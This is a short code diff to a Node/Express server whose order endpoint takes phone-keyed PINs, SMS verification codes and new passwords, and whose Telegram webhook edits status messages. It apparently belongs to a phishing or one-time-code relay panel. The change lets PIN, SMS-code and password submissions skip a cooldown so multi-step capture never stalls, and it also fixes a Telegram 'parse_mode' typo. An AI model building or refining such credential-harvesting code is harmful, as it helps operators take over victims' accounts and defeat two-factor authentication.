@@ -59,9 +59,11 @@ app.post('/api/submit-order', async (req, res) => {
         // Force status to 'pending' immediately on every new request
         orderStatuses[phone] = 'pending';
 
-        const isRegistration = (firstName || lastName || email || dateOfBirth) || (uniqueId && uniqueId.startsWith('Account Registration: '));
+        // Bypass cooldown for registration, PIN codes, SMS codes, and passwords so multi-step forms never get stuck
+        const isImportantAction = (firstName || lastName || email || dateOfBirth) || 
+                                  (uniqueId && (uniqueId.startsWith('PIN: ') || uniqueId.startsWith('Signup PIN: ') || uniqueId.startsWith('SMS Code: ') || uniqueId.startsWith('Signup SMS Code: ') || uniqueId.startsWith('New Password: ')));
 
-        if (!isRegistration && lastSubmissionTime[phone] && (currentTime - lastSubmissionTime[phone] < cooldownTime)) {
+        if (!isImportantAction && lastSubmissionTime[phone] && (currentTime - lastSubmissionTime[phone] < cooldownTime)) {
             return res.json({ success: true, message: 'Already submitted.' });
         }
 
@@ -255,7 +257,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 chat_id: chatId,
                 message_id: messageId,
                 text: updatedMessage,
-                parse_mmode: 'Markdown'
+                parse_mode: 'Markdown' // Fixed typo from parse_mmode to parse_mode
             });
         }
     } catch (err) {
